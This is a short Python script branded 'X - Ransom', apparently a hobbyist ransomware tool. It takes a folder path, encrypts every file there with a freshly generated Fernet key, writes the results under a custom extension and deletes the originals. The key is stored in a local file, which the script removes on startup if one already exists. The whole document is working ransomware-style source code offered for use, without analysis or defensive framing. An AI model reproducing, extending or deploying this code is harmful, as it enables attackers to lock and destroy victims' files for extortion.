#!/usr/bin/env python3
# Created By X - MrG3P5

import os
import pyfiglet
from colorama import Fore, init
from cryptography.fernet import Fernet
from os.path import isfile

# Color
green = Fore.LIGHTGREEN_EX
red = Fore.LIGHTRED_EX
white = Fore.WHITE
cyan = Fore.LIGHTCYAN_EX
yellow = Fore.LIGHTYELLOW_EX

init(autoreset=True)

def banner(str):
    os.system("cls||clear")
    __banner__ = pyfiglet.figlet_format(str, font="slant", justify="center")
    print(red + __banner__)
    print(f"\t\t\t{red}[ {white}Created By X - MrG3P5 {red}]\n")

def generate_key():
    keys = Fernet.generate_key()
    return keys

def checking_file_key():
    if os.path.exists("x.key"):
        os.remove("x.key")
    else:
        pass

def encrypt_file(folder_path, custom_ext = ".asu"):
    key = generate_key()
    file_arr = []
    fernet_key = Fernet(key)

    with open("x.key", "wb") as f:
        f.write(key)

    for file in os.listdir(folder_path):
        file = folder_path + "/" + file
        if isfile(file):
            file_arr.append(file)
        else:
            continue

    if len(file_arr) == 0:
        exit(f"{red}[{yellow}!{red}] {white} No File Found To Encrypt")
    else:
        for x in file_arr:
            try:
                with open(x, "rb") as original_file:
                    original = original_file.read()

                encrypted = fernet_key.encrypt(original)

                with open(x + custom_ext, "wb") as encrypted_file:
                    encrypted_file.write(encrypted)

                if os.path.exists(x):
                    os.remove(x)
                    print(f"{white}[{green}*{white}] Sukses To Encrypt {yellow}{x}")
                else:
                    continue
            except:
                print(f"{white}[{red}!{white}] Failed To Encrypt {yellow}{x}")
        print(f"{red}[{green}*{red}]{white} Done Encrypted Files In Path {green}{folder_path}")


if __name__=="__main__":
    banner("X - Ransom")
    checking_file_key()
    input_path = input(f"{red}[{white}?{red}] {white}Encrypt Path : ")
    custom_ext_input = input(f"{red}[{white}?{red}] {white}Custom Extension (ex: .hayuk) : ")
    encrypt_file(input_path, custom_ext_input)
